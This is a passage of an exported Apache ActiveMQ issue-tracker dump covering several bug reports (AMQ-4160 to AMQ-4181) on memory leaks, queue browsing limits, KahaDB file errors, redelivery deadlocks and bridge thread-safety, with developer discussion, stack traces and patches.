;;;","29/Nov/12 04:02;jeff.huang;The change on finalize() won't fix the problem because java.util.zip.Inflater tries that already. The memory problem happens out of the normal heap and GC won't detect the memory shortage, in turn objects won't be wiped out at all.;;;","29/Nov/12 21:11;tabish;You're welcome to submit a patch if you can see a reasonable solution to the issue you are seeing. ;;;","29/Nov/12 22:19;jeff.huang;Unfortunately, I don't have a solution for that. I would tend to say that there is not a valid solution for that. 

We could try to add a close() or release() method to ActiveMQBytesMessage, but I don't think the users are going to call it because it is not part of the JMS API. 

Or we can try to find another pure Java compression library to avoid the need to release the resource explicitly. But that may probably mean we need to sacrifice some performance when doing compression.

Or we may want to decompress the whole buffer, instead of remaining a stream for it. The memory footprint would be bigger, but comparing to blowing out the whole system, this is acceptable.

Or we can call off this feature. Tell the users not to use BytesMessage in ActiveMQ when they try to use compression.;;;","23/Apr/14 10:59;dejanb;I implemented explicit compression/decompression of the payload when we initialise writing and reading operations.

http://git-wip-us.apache.org/repos/asf/activemq/commit/44bb9fbe

With this we can avoid using finalize() to close the streams, which can cause memory leaks. The trade-off is that we keep uncompressed messages in memory, but IMHO that's not an issue as compression is meant to be used on the wire and the similar approach is used for other kind of messages.

There's still couple of more places where we should remove finalize();;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
JMS queue browser returns only page size number of messages,AMQ-4181,12616921,,Bug,Resolved,AMQ,ActiveMQ,software,bsnyder,"<a href=""http://activemq.apache.org/"">Apache ActiveMQ</a> is the most popular and powerful open source Message Broker. Apache ActiveMQ is fast, supports many <a href=""http://activemq.apache.org/cross-language-clients.html"">Cross Language Clients and Protocols</a> and many <a href=""http://activemq.apache.org/features.html"">advanced features<a> while fully supporting JMS 1.1 and J2EE 1.4. Apache ActiveMQ is released under the Apache 2.0 License",http://activemq.apache.org/,Major,Fixed,gtully,dejanb,dejanb,20/Nov/12 11:53,06/Dec/20 02:43,14/Jul/23 05:43,22/Oct/13 14:39,5.7.0,,,,,5.10.0,5.9.1,,,,,,0,,,,,,,,,"When the number of messages in the queue is larger than set page size, the jms queue browser will get one page size of messages (200 by default).

Ideally we'd want to send all the messages or at least until we reach the memory limit set for the queue/broker.
",,dejanb,gtully,jira-bot,omnibot2k,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,AMQ-2040,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,0.0,,,,,,,,,,,,,,,,,,,,,,false,,,,,,,,,,,,,,,,,258810,,,Fri Jun 03 14:14:26 UTC 2016,,,,,,,,,,,"0|i0l4fb:",121367,,,,,,,,,,,,,,,,,,,,,"20/Nov/12 12:01;dejanb;Fixed with svn revision 1411632;;;","17/Oct/13 11:13;gtully;think we need a way to make this change configurable based on the existing maxBrowsePageSize. It is now obsolete, but I think using a value of -1 to mean ignore the page limit and use all available memory could make sense. In other words, to remove the browsePageLimit use a value of -1 and when it is specified > 0 it is the hard limit.
This means that really large depths can be bounded in a browse. consider a queue with 1m messages and lots of broker memory... our browser will fall over. ;;;","22/Oct/13 14:39;gtully;maxBrowsePageSize > 0 will now limit a browser dispatch.
https://git-wip-us.apache.org/repos/asf?p=activemq.git;a=commit;h=85bc9ce9

If there is no applicable policy entry the max == 0 and in that case the memory limit will apply.
the default maxBrowsePageSize from a matching policy entry is 2*maxPageSize so 400;;;","22/Oct/13 14:41;gtully;to have browser dispatch limited only by destination memory - even if dispatch is non optimal - ensure no matching policy entry for the destination or explicitly provide one with maxBrowsePageSize=0;;;","23/May/16 12:30;jira-bot;Commit b4e35fe8a355c0fd5fe8935ab583e2886121946b in activemq's branch refs/heads/master from [~gtully]
[ https://git-wip-us.apache.org/repos/asf?p=activemq.git;h=b4e35fe ]

AMQ-4181 - revert mod to testQueueBrowserWith2ConsumersInterleaved which cause intermittent ci failure - browse is a snapshot at time of creation. tidy up some gaps in pagein logic sync
;;;","03/Jun/16 14:14;jira-bot;Commit 857597ca9ee0b7d5c0ae3673cd33e8829ce10e00 in activemq's branch refs/heads/master from [~gtully]
[ https://git-wip-us.apache.org/repos/asf?p=activemq.git;h=857597c ]

AMQ-4181 - browser 'may' have more than 1 so message 'may' remain
;;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
can't install activemq-extra feature,AMQ-4179,12616404,,Bug,Resolved,AMQ,ActiveMQ,software,bsnyder,"<a href=""http://activemq.apache.org/"">Apache ActiveMQ</a> is the most popular and powerful open source Message Broker. Apache ActiveMQ is fast, supports many <a href=""http://activemq.apache.org/cross-language-clients.html"">Cross Language Clients and Protocols</a> and many <a href=""http://activemq.apache.org/features.html"">advanced features<a> while fully supporting JMS 1.1 and J2EE 1.4. Apache ActiveMQ is released under the Apache 2.0 License",http://activemq.apache.org/,Major,Fixed,janstey,janstey,janstey,16/Nov/12 13:03,16/Nov/12 13:05,14/Jul/23 05:43,16/Nov/12 13:05,,,,,,5.8.0,,,,,,,0,,,,,,,,,"You can't install the activemq-extra feature currently:

karaf@root> features:install activemq-extra 
Error executing command: Can not resolve feature:
Unsatisfied requirement(s):
---------------------------
   package:(&(package=org.fusesource.hawtdispatch.transport)(version>=1.12.0))
      mqtt-client
   package:(&(package=org.fusesource.hawtdispatch.util)(version>=1.12.0))
      mqtt-client

This is because mqtt-client 1.4 has a dependency on hawtdispatch 1.12. This is not a problem in any released version.
",,janstey,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,0.0,,,,,,,,,,,,,,,,,,,,,,false,,,,,,,,,,,,,,,,,258185,,,Fri Nov 16 13:05:51 UTC 2012,,,,,,,,,,,"0|i0knmf:",118644,,,,,,,,,,,,,,,,,,,,,"16/Nov/12 13:05;janstey;[janstey@duffman trunk]$ svn ci -m ""AMQ-4179 - can't install activemq-extra feature""
Sending        pom.xml
Transmitting file data .
Committed revision 1410325.
;;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
RAR needs additional module includes post module refactor,AMQ-4172,12616048,,Bug,Resolved,AMQ,ActiveMQ,software,bsnyder,"<a href=""http://activemq.apache.org/"">Apache ActiveMQ</a> is the most popular and powerful open source Message Broker. Apache ActiveMQ is fast, supports many <a href=""http://activemq.apache.org/cross-language-clients.html"">Cross Language Clients and Protocols</a> and many <a href=""http://activemq.apache.org/features.html"">advanced features<a> while fully supporting JMS 1.1 and J2EE 1.4. Apache ActiveMQ is released under the Apache 2.0 License",http://activemq.apache.org/,Major,Fixed,gtully,gtully,gtully,14/Nov/12 11:27,30/Aug/13 14:31,14/Jul/23 05:43,28/Aug/13 14:55,5.8.0,,,,,5.9.0,,,JCA Container,,,,0,,,,,,,,,"see results of some 5.8-SNAPSNOT verification

https://issues.apache.org/jira/browse/AMQ-4166?focusedCommentId=13497034&page=com.atlassian.jira.plugin.system.issuetabpanels:comment-tabpanel#comment-13497034

seems spring and core modules need to be included in the rar.",,gtully,tabish,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,AMQ-4602,,,,,,,,,,,,,,,,,,,,,,,,,,,,,0.0,,,,,,,,,,,,,,,,,,,,,,false,,,,,,,,,,,,,,,,,257663,,,Fri Dec 07 15:45:51 UTC 2012,,,,,,,,,,,"0|i0k3wf:",115449,,,,,,,,,,,,,,,,,,,,,"07/Dec/12 15:45;tabish;Added some work to the rar pom.xml gets activemq-spring in there.  Seems like the XBeanBrokerFactory should really be part of activemq-broker. ;;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
KahaDB / Journal rotateWriteFIle() sometimes too fast?,AMQ-4171,12615693,,Bug,Resolved,AMQ,ActiveMQ,software,bsnyder,"<a href=""http://activemq.apache.org/"">Apache ActiveMQ</a> is the most popular and powerful open source Message Broker. Apache ActiveMQ is fast, supports many <a href=""http://activemq.apache.org/cross-language-clients.html"">Cross Language Clients and Protocols</a> and many <a href=""http://activemq.apache.org/features.html"">advanced features<a> while fully supporting JMS 1.1 and J2EE 1.4. Apache ActiveMQ is released under the Apache 2.0 License",http://activemq.apache.org/,Major,Fixed,tabish,mtmvetter,mtmvetter,12/Nov/12 09:53,07/Dec/12 21:30,14/Jul/23 05:43,07/Dec/12 21:30,5.6.0,,,,,5.8.0,,,Broker,,,,0,,,,,,,,,"On very fast test machines we got predictable FileNotFoundExceptions when a KahaDB data file was to be replaced by its successor.

See this from the log file:

30.10.2012 21:00:56.359 [ActiveMQ Transport: tcp:///192.168.111.128:3134] [  ]  master-My-Company-S1-kellner20-vm Message ID:kellner20-vm-3125-1351618296390-23:1:1:2086:1 sent to queue://My-Company.dxm.request.provisionToTS
30.10.2012 21:00:56.359 [BrokerService[master-My-Company-S1-kellner20-vm] Task-197] [  ]  My-Company.dxm.request.provisionToTS toPageIn: 1, Inflight: 0, pagedInMessages.size 0, enqueueCount: 2125, dequeueCount: 2124

-------------------------------------------------------------------------------
30.10.2012 21:00:56.390 [ConcurrentQueueStoreAndDispatch] [  ] *** SEVERE ***
Called from org.apache.activemq.store.kahadb.MessageDatabase.store()
 KahaDB failed to store to Journal
-------------------------------------------------------------------------------

java.io.FileNotFoundException: activemq-data\master-My-Company-S1-kellner20-vm\KahaDB\db-2.log (The system cannot find the path specified)
	at java.io.RandomAccessFile.open(Native Method)
	at java.io.RandomAccessFile.<init>(Unknown Source)
	at org.apache.kahadb.journal.DataFile.openRandomAccessFile(DataFile.java:70)
	at org.apache.kahadb.journal.DataFileAppender.processQueue(DataFileAppender.java:309)
	at org.apache.kahadb.journal.DataFileAppender$1.run(DataFileAppender.java:188)

30.10.2012 21:00:56.375 [BrokerService[master-My-Company-S1-kellner20-vm] Task-197] [  ]  org.apache.activemq.broker.region.cursors.QueueStorePrefetch@1afd356:My-Company.dxm.request.provisionToTS,batchResetNeeded=false,storeHasMessages=true,size=0,cacheEnabled=true - fillBatch
30.10.2012 21:00:56.421 [ConcurrentQueueStoreAndDispatch] [  ] NOTIFICATION:  HighWater of SEVERE exceeded (value=1, highwater=1)!
30.10.2012 21:00:56.437 [ConcurrentQueueStoreAndDispatch] [  ]  Stopping the broker due to IO exception, java.io.FileNotFoundException: activemq-data\master-My-Company-S1-kellner20-vm\KahaDB\db-2.log (The system cannot find the path specified)
java.io.FileNotFoundException: activemq-data\master-My-Company-S1-kellner20-vm\KahaDB\db-2.log (The system cannot find the path specified)
	at java.io.RandomAccessFile.open(Native Method)
	at java.io.RandomAccessFile.<init>(Unknown Source)
	at org.apache.kahadb.journal.DataFile.openRandomAccessFile(DataFile.java:70)
	at org.apache.kahadb.journal.DataFileAppender.processQueue(DataFileAppender.java:309)
	at org.apache.kahadb.journal.DataFileAppender$1.run(DataFileAppender.java:188)

********************
(end of log file quotation)
********************

Having evaluated all possibilities of the failure, we finally patched the following method of the class Journal::


synchronized DataFile rotateWriteFile() {
        int nextNum = !dataFiles.isEmpty() ? dataFiles.getTail().getDataFileId().intValue() + 1 : 1;
        File file = getFile(nextNum);
        DataFile nextWriteFile = new DataFile(file, nextNum, preferedFileLength);
PATCH START       try {
   			Thread.sleep(10000);
		} catch (InterruptedException e) {
			e.printStackTrace();
		}
PATCH END
        // actually allocate the disk space
        fileMap.put(nextWriteFile.getDataFileId(), nextWriteFile);
        fileByFileMap.put(file, nextWriteFile);
        dataFiles.addLast(nextWriteFile);
        return nextWriteFile;
    }
*************

This helped, the IO Exception never occurred again after this patch.
It seems that the ""nextWriteFile""-object was  returned, while the allocating of the new Data File wasn't finished yet. 
Anyway, it is very strange that we should have detected this problem, and it never occurred earlier - at least no similar bug (???) seems to have been reported. Therefore, a critical examination of possibly deeper causes could be useful.
Best regards, 
Matthias Vetter
ATOS, Frankfurt
",Tested on Windows XP,mtmvetter,tabish,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,0.0,,,,,,,,,,,,,,,,,,,,,,false,,,,,,,,,,,,,,,,,256998,,,Fri Dec 07 21:30:27 UTC 2012,,,,,,,,,,,"0|i0j1bz:",109146,,,,,,,,,,,,,,,,,,,,,"13/Nov/12 15:15;tabish;This artificial delay is probably just masking some other issue as the allocation of the DataFile object doesn't actually cause a file to be created or read, only when DataFile.openRandomAccessFile is called is the file going to get created.  ;;;","13/Nov/12 15:28;mtmvetter;Hi Timothy, 
you are right, and I am sorry for having created an issue entry too early. Nevertheless, the delay really helped for some time. But today we detected an fileNotFound Exception inspite the delay, eventually. 
So we have to keep on searching for the real problem..
Thanks! 

Best regards, 
Matthias Vetter

;;;","23/Nov/12 10:31;mtmvetter;After deeper examination of the above described failure, we still have no solution to the problem:
It is always possible to create the first file db-1.log. But the creation of its successor always fails, always with the same exception: file not found, the system cannot find the path specified. 
The DataFileAppender gets the next DataFile-object (from the method we suspected to be too fast) and then this DataFile object‘s method openRandomAccessFile is called. At this moment, the physical file is not yet existing, the RandomAccessFile-constructor called by the open-method is supposed to create the file. It did so, when db-1.log was created. The path to the files, naturally, wasn’t changed after that, and the same rights in the file system still are granted. 
The only difference we see is, that now another file is already present and is about to be deleted. But should this have such an effect?
We also suspected the whitespaces in the absolute path to the file to be a problem – but why not in the first case with db-1.log?
Even more irritating is that obviously no one else faced such kind of FileNotFound problem with the KahaDB. 
Finally, the problem seems to occur not on Windows 7, as initially reported, but on Windows XP. It also didn’t occur on a Solaris machine. 
Please, has anyone an idea what could be going on here?  Any comment is welcome!!!!
;;;","26/Nov/12 16:21;tabish;Suggest moving to a later patch release of the JDK could be an issue there with Windows XP.;;;","27/Nov/12 16:27;mtmvetter;In the meantime we found out, that all depends on the way we start our server, in which the broker is embedded. Using Windows (Win7 or xp, JDK 6 or 7 - all this doesn't matter), we can start the server either as a Windows service, using a .ini-file, from which jre/bin/server/jvm.dll is called, 
either manually using a .bat-file, calling java.exe. The jvm-parameters we pass are both times the same.
Starting java.exe never leads to the described failures, starting with java.dll always. Needless to say, it stays a riddle how the start methods are related to the fileNotFound problem.
Anyone experienced something like this?
m.v.
;;;","29/Nov/12 13:22;mtmvetter;Although it is strange that the file not found behaviour depends on the starting mode, there is a possibility to prevent the exception: 
org.apache.kahadb.journal.DataFile.openRandomAccessFile 
calls: new RandomAccessFile(file, ""rw"");. Replacing this by
new RandomAccessFile(file.getCanonicalPath(), ""rw""); helped!

Whatever the deeper causes for the problem may be, the kahaDB would gain stability by opening RandomAccessFiles generally with os-proof pathnames rather than with file objects.

;;;","30/Nov/12 16:16;tabish;The getCanonicalPath change makes sense and I've applied that on trunk, not sure what else can be done here. ;;;","07/Dec/12 21:30;tabish;The fix for the canonical file name use on open is in, not sure what else can be done here if anything.  The issue seems to be OS and JVM related not broker related. ;;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
MQTTSSLTest.testTurnOffInactivityMonitor Disabled.,AMQ-4168,12615492,,Bug,Resolved,AMQ,ActiveMQ,software,bsnyder,"<a href=""http://activemq.apache.org/"">Apache ActiveMQ</a> is the most popular and powerful open source Message Broker. Apache ActiveMQ is fast, supports many <a href=""http://activemq.apache.org/cross-language-clients.html"">Cross Language Clients and Protocols</a> and many <a href=""http://activemq.apache.org/features.html"">advanced features<a> while fully supporting JMS 1.1 and J2EE 1.4. Apache ActiveMQ is released under the Apache 2.0 License",http://activemq.apache.org/,Major,Fixed,chirino,chirino,chirino,09/Nov/12 15:12,09/Nov/12 15:36,14/Jul/23 05:43,09/Nov/12 15:36,,,,,,,,,,,,,0,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,0.0,,,,,,,,,,,,,,,,,,,,,,false,,,,,,,,,,,,,,,,,256780,,,2012-11-09 15:12:30.0,,,,,,,,,,,"0|i0ir1b:",107474,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
MQTTTest.testInactivityTimeoutDisconnectsClient is failing,AMQ-4167,12615491,,Bug,Resolved,AMQ,ActiveMQ,software,bsnyder,"<a href=""http://activemq.apache.org/"">Apache ActiveMQ</a> is the most popular and powerful open source Message Broker. Apache ActiveMQ is fast, supports many <a href=""http://activemq.apache.org/cross-language-clients.html"">Cross Language Clients and Protocols</a> and many <a href=""http://activemq.apache.org/features.html"">advanced features<a> while fully supporting JMS 1.1 and J2EE 1.4. Apache ActiveMQ is released under the Apache 2.0 License",http://activemq.apache.org/,Major,Fixed,chirino,chirino,chirino,09/Nov/12 15:09,09/Nov/12 15:36,14/Jul/23 05:43,09/Nov/12 15:36,,,,,,,,,,,,,0,,,,,,,,,Disabled MQTTTest.testInactivityTimeoutDisconnectsClient since it is failing.  Need to look into why.,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,0.0,,,,,,,,,,,,,,,,,,,,,,false,,,,,,,,,,,,,,,,,256779,,,2012-11-09 15:09:47.0,,,,,,,,,,,"0|i0ir13:",107473,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
RedeliveryPlugin causes a deadlock with JobSchedulerImpl,AMQ-4166,12615460,,Bug,Closed,AMQ,ActiveMQ,software,bsnyder,"<a href=""http://activemq.apache.org/"">Apache ActiveMQ</a> is the most popular and powerful open source Message Broker. Apache ActiveMQ is fast, supports many <a href=""http://activemq.apache.org/cross-language-clients.html"">Cross Language Clients and Protocols</a> and many <a href=""http://activemq.apache.org/features.html"">advanced features<a> while fully supporting JMS 1.1 and J2EE 1.4. Apache ActiveMQ is released under the Apache 2.0 License",http://activemq.apache.org/,Major,Fixed,,barlabanov,barlabanov,09/Nov/12 10:57,21/Jan/16 18:35,14/Jul/23 05:43,21/Jan/16 18:35,5.7.0,,,,,,,,Broker,,,,0,,,,,,,,,"Originates from the forum discussion http://activemq.2283324.n4.nabble.com/RedeliveryPlugin-causes-a-deadlock-with-JobSchedulerImpl-in-ActiveMQ-5-7-0-tt4659019.html

we have RedeliveryPlugin causing thread deadlock together with JobSchedulerImpl. ActiveMQ version is 5.7.0. We activated RedeliveryPlugin in our broker config xml (see below). There two stacktraces below as well. One is from ActiveMQ VMTransport thread, which tries to send a message to a dead letter queue using RedeliveryPlugin. RedeliveryPlugin just tries to reschedule the message for redelivery and for that it calls JobSchedulerImpl and blocks on its synchronized method ""schedule"". On the way ""consumersLock"" is locked. 
Another stack trace is from JobScheduler:JMS thread, which fires a job to redeliver some message and tries to send it using the same queue used by the VMTransport thread. And it blocks on that consumersLock locked by the VMTransport thread. And this occurs in JobSchedulerImpl#mainLoop method inside synchronized {} block causing a deadlock, since the VMTransport thread tries to call another synchronized method of JobSchedulerImpl. The art how RedeliveryPlugin and JobSchedulerImpl are programmed seems to be quite dangerous, since they both access the queues and try to acquire queue locks. And additionally synchronized methods of JobSchedulerImpl are called directly from RedeliveryPlugin making that to a nice source of thread deadlocks. And I see no measures taken in the code to avoid these deadlocks.
We can reproduce it quite often if we start ActiveMQ with empty stores (kahadb and scheduler stores are deleted manually from the file system before startup). But looking at the code, I would say that the problem may occur in any situation in any deployment scenario (standalone or embedded in a JEE container). It is just enough to have some Transport thread redelivering a message and the JobScheduler thread trying to fire a job at the same moment on the same queue.
And another strange thing, which is may be has nothing to do with the deadlock but is still strange, is that according to the stack trace RedeliveryPlugin tries to redeliver an expired message.

broker config and the stack traces are attached to the issue.","Reproduced on Windows 8, Windows Vista, MacOS X
with Oracle jdk 1.7.0_07. ActiveMQ is started embedded using RAR inside Glassfish 3.1.2.2.",barlabanov,gtully,lichtin,tabish,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,"09/Nov/12 11:02;barlabanov;broker-config.xml;https://issues.apache.org/jira/secure/attachment/12552813/broker-config.xml","09/Nov/12 11:02;barlabanov;stack-trace-1.txt;https://issues.apache.org/jira/secure/attachment/12552814/stack-trace-1.txt","09/Nov/12 11:02;barlabanov;stack-trace-2.txt;https://issues.apache.org/jira/secure/attachment/12552815/stack-trace-2.txt",,,,,,,,,,,,,,,,,,,3.0,,,,,,,,,,,,,,,,,,,,,,false,,,,,,,,,,,,,,,,,256743,,,Thu Jan 21 18:35:25 UTC 2016,,,,,,,,,,,"0|i0iqsv:",107436,,,,,,,,,,,,,,,,,,,,,"09/Nov/12 11:02;barlabanov;Broker config and the stack traces of the participating threads.;;;","09/Nov/12 11:08;barlabanov;With this deadlock problem the new feature announced for 5.7.0 about per-destination redelivery configuration is actually unusable. I see no workaround besides fallback to use ConnectionFactory to configure the redelivery.;;;","09/Nov/12 21:36;gtully;I think the processing of expired messages in error is the root cause or the deadlock.
The correct expiry check is in http://svn.apache.org/viewvc?rev=1407640&view=rev
There is only one valid path to scheduled redelivery and this is through the receipt of a poison ack with just a subscription dispatch lock held.
If optimizedDispatch is used, such that the scheduler send thread does a dispatch, there is a deadlock possibility.
The fix is either to split schedule and execute in the scheduler or let the redelivery plugin do the schedule async. The simplest solution is to schedule async i think.
@Sergiy, from your config, you don't use optimizedDispatch so you should be set.
Would it be possible to validate using a 5.8-SNAPSHOT.
;;;","09/Nov/12 21:40;gtully;@Sergiy, btw - thanks for the stack traces :-);;;","13/Nov/12 14:51;barlabanov;I will try 5.8-SNAPSHOT the next days and write the feedback.;;;","14/Nov/12 11:17;barlabanov;Just tried our application with ActiveMQ 5.8-SNAPSHOT. No deadlocks detected. Looks good. optimizedDispatch was set to true.

One question: would it be enough to take 1407640 revision to get the bug patched in 5.7.0? It looks that message expiry is not the only problem causing the deadlock. You wrote something about ""split schedule and execute in the scheduler or let the redelivery plugin do the schedule async"".;;;","14/Nov/12 11:18;barlabanov;Just a few notes: when I tried the resource adapter of 5.8-SNAPSHOT the following problems occured:
1. activemq-core.jar was not inside the rar. This resulted in XBeanBrokerFactory ClassNotFoundException.
2. activemq-spring.jar was missing in the rar as well. This resulted in the missing namespace exception (http://activemq.apache.org/schema/core) since activemq.xsd in inside activemq-spring.jar

I had to add the missing jars manually in order to get the RAR deployed.;;;","14/Nov/12 11:23;gtully;@Sergiy - 1407640 revision is sufficient provide u use the default optimizedDispatch=""false"". With it true, there is a chance of deadlock given specific circumstances.;;;","14/Nov/12 11:28;gtully;opened https://issues.apache.org/jira/browse/AMQ-4172 to track RAR issues with snapshot;;;","21/Jan/16 18:35;tabish;Multiple fixes and refactorings in this area since this was opened.  Not test case to confirm all paths are correct but reported that it was working in a 5.8-SNAPSHOT;;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
"DiscoveryNetworkConnector can lose track of active bridges, resulting in permanent bridge failure or continued attempts to re-connect existing bridges",AMQ-4160,12614725,,Bug,Resolved,AMQ,ActiveMQ,software,bsnyder,"<a href=""http://activemq.apache.org/"">Apache ActiveMQ</a> is the most popular and powerful open source Message Broker. Apache ActiveMQ is fast, supports many <a href=""http://activemq.apache.org/cross-language-clients.html"">Cross Language Clients and Protocols</a> and many <a href=""http://activemq.apache.org/features.html"">advanced features<a> while fully supporting JMS 1.1 and J2EE 1.4. Apache ActiveMQ is released under the Apache 2.0 License",http://activemq.apache.org/,Critical,Fixed,tabish,stirlingc,stirlingc,04/Nov/12 19:18,02/May/13 02:30,14/Jul/23 05:43,29/Nov/12 22:38,,,,,,5.8.0,,,,,,,0,,,,,,,,,"Symptom
=======
{{DiscoveryNetworkConnector}} is not thread-safe, and as a result, race conditions allow the {{bridges}} data structure to become corrupt and not accurately represent the bridges that exist.

Because {{bridges}} is used to control whether a discovery event will result in a bridge creation attempt, if it is not accurate, two results are possible:

# A discovery event will be ignored even though its corresponding bridge is not active; as a result, the bridge will never be established
# A discovery event will be processed even though its corresponding bridge is active; as a result, the bridge creation will fail (because of duplicate connections), and be indefinitely retried, generating many WARN/ERROR log messages

Cause
=====
{{DiscoveryNetworkConnector}} updates a {{bridges}} hashmap whenever a bridge is created or removed:

{code:title=DiscoveryNetworkConnector.java}
public void onServiceAdd(DiscoveryEvent event) {
...
        // Should we try to connect to that URI?
        synchronized (bridges) {
            if( bridges.containsKey(uri) ) {
                if (LOG.isDebugEnabled()) {
                    LOG.debug(""Discovery agent generated a duplicate onServiceAdd event for: ""+uri );
                }
                return;
            }
        }
...
        NetworkBridge bridge = createBridge(localTransport, remoteTransport, event);
        try {
            bridge.start();
            synchronized (bridges) {
                bridges.put(uri, bridge);
            }
...
}


public void onServiceRemove(DiscoveryEvent event) {
    String url = event.getServiceName();
    if (url != null) {
        URI uri;
        try {
            uri = new URI(url);
        } catch (URISyntaxException e) {
            LOG.warn(""Could not connect to remote URI: "" + url + "" due to bad URI syntax: "" + e, e);
            return;
        }

        synchronized (bridges) {
            bridges.remove(uri);
        }
    }
}
{code}

There are a number of problems:

# The check-and-set for adding an entry {{bridges}} is not atomic.  As a result, concurrent attempts to add a bridge to the same URL can be allowed to proceed to bridge creation.  Only one of the bridges will be established (the other will fail when it attempts to add duplicate connections); however, the failure of the second bridge will result in a call to {{onServiceRemove(...)}} that will remove the single/shared {{bridges}} entry.
# The bridge is started before an entry is added to {{bridges}}.  Since bridges are multi-threaded, it is possible that an exception will be handled by a different thread at some time between {{bridge.start()}} and {{bridges.put(uri, bridge}}.  In processing this exception, the thread will call {{onServiceRemove(...}}, which will remove the (non-existent) {{bridges}} entry.  Subseqently, {{bridges.put(uri, bridge)}} is executed, and adds the entry to {{bridges}} even though it is now stale and represents a failed bridge.  Subsequent attempts to restore the bridge will be ignored, and no active bridge will be created.

The lack of thread-safety in {{DiscoveryNetworkConnector}} is exacerbated by AMQ-4159, which can result in many concurrent attempts to establish a bridge to the same URL.  AMQ-4159 also described how multiple calls can be made to {{onServiceRemove(...)}}, which can result in mal-behaviour similar to the second case described above (i.e., unexpected removal of a bridge that is active).

Solution
========
The attached patch attempts to restore some thread-safety to {{DiscoveryNetworkConnector}} by making the check-and-set atomic and adding the entry to {{bridges}} prior to starting the bridge.  An additional structure, {{activeEvents}}, keeps track of the event that represents the current attempt to establish a bridge to a given remote URL --- this is used to prevent multiple calls to {{onServiceRemove(...)}} from removing a {{bridges}} entry that was *not* added by the corresponding discovery event.  

This patch is a band aid to the design flaws in {{DiscoveryNetworkConnector}}, and a refactoring of the connector should be considered.  In particular, there is a tight-coupling between {{DiscoveryNetworkConnector}} and {{SimpleDiscoveryAgent}} that is not evident through their interfaces.  For example, {{DiscoveryNetworkConnector}} assumes that the call to {{discoveryAgent.serviceFailed(...)}} will result in a call back to {{DiscoveryNetworkConnector.onServiceRemove(...)}}.  The call to {{onServiceRemove(...)}} is necessary to clean up the resources used by the bridge, but that requirement is not explicit, and therefore easily missed.",,ceposta,gtully,lukejackson,stirlingc,tabish,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,AMQ-3993,,,AMQ-4159,,,,,,,,,,,,,"04/Nov/12 19:23;stirlingc;AMQ4160.patch;https://issues.apache.org/jira/secure/attachment/12552036/AMQ4160.patch","04/Nov/12 19:20;stirlingc;AMQ4160Test.java;https://issues.apache.org/jira/secure/attachment/12552035/AMQ4160Test.java","13/Nov/12 22:39;stirlingc;AMQ4160_2.patch;https://issues.apache.org/jira/secure/attachment/12553390/AMQ4160_2.patch",,,,,,,,,,,,,,,,,,,3.0,,,,,,,,,,,,,,,,,,,,,,false,,,,,,,,,,,,,,,,,255148,,,Tue Jan 08 22:12:48 UTC 2013,,,,,,,Patch Available,,,,"0|i0epo7:",83921,,,,,,,,,,,,,,,,,,,,,"04/Nov/12 19:20;stirlingc;Unit test that demonstrates the race conditions described in this ticket.  Both tests fail before the patch and pass after the patch.;;;","04/Nov/12 19:23;stirlingc;Patch to address the reported issue.;;;","04/Nov/12 19:24;stirlingc;AMQ-4159 creates conditions that are ideal for AMQ-4160 to be exhibited; however, AMQ-4160 can still occur even with AMQ-4159 fixed.;;;","05/Nov/12 16:46;stirlingc;Copying this comment through from AMQ-4159 since it is salient to the fix described in AMQ-4160:

Thanks for the fast turnaround, Timothy. I linked AMQ-4159 and AMQ-4160 together as they are related (at least the symptoms were observed during the same test that we were running). Now that I think about it, the fix for AMQ-4160 relies on AMQ-4159 (i.e., one-to-one relationship between DiscoveryEvent and a bridge creation attempt). It would be great if AMQ-4160 could also be fixed for AMQ 5.8.0.
;;;","05/Nov/12 20:22;tabish;Needed to confirm that this didn't break any tests and there's currently some instability in some of the network tests.  Looks good, nice work.;;;","07/Nov/12 17:53;stirlingc;Reopening as I've found two problems with the patch as applied:

+            // Should we try to connect to that URI?
+            if (activeEvents.putIfAbsent(uri, event) != null) {
+                LOG.debug(""Discovery agent generated a duplicate onServiceAdd event for: ""+uri );
+            }

---> there should be a ""return"" statement after the LOG.debug

+            // Only remove bridge if this is the active discovery event for the URL.
+            if (activeEvents.remove(url, event)) {
+                synchronized (bridges) {
+                    bridges.remove(uri);
+                }

---> the activeEvents.remove(url, event)) should be activeEvents.remove(uri, event) (i.e., uri instead of url)

